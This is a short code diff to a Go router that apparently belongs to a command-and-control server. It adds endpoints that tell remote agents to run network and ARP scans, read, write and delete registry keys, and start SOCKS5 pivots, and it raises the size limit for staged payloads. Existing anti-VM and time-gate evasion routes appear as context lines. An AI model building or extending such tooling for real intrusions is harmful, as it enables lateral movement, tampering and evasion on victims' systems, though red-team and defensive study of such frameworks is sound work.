@@ -143,8 +143,26 @@ func (r *Router) Setup() *gin.Engine {
 		v1.POST("/agent/:id/opsec/antivm", r.handlers.AntiVM)
 		v1.POST("/agent/:id/opsec/timegate", r.handlers.TimeGateSet)
 
-		// Stage management (operator)
-		v1.POST("/stage", r.handlers.CreateStage)
+		// Phase 11 — Network recon
+		v1.POST("/agent/:id/pivot/netscan", r.handlers.NetScan)
+		v1.POST("/agent/:id/pivot/arpscan", r.handlers.ARPScan)
+
+		// Phase 11 — Registry
+		v1.POST("/agent/:id/registry/read", r.handlers.RegRead)
+		v1.POST("/agent/:id/registry/write", r.handlers.RegWrite)
+		v1.POST("/agent/:id/registry/delete", r.handlers.RegDelete)
+		v1.POST("/agent/:id/registry/list", r.handlers.RegList)
+
+		// Phase 11 — SOCKS5 pivot
+		v1.POST("/agent/:id/pivot/socks5/start", r.handlers.SOCKS5Start)
+		v1.POST("/agent/:id/pivot/socks5/stop", r.handlers.SOCKS5Stop)
+		v1.POST("/agent/:id/pivot/socks5/status", r.handlers.SOCKS5Status)
+
+		// Stage management (operator) — base64 payload can reach ~67 MB for 50 MB binary
+		v1.POST("/stage", func(c *gin.Context) {
+			c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, 100*1024*1024)
+			r.handlers.CreateStage(c)
+		})
 		v1.GET("/stages", r.handlers.ListStages)
 		v1.DELETE("/stage/:token", r.handlers.DeleteStage)
 
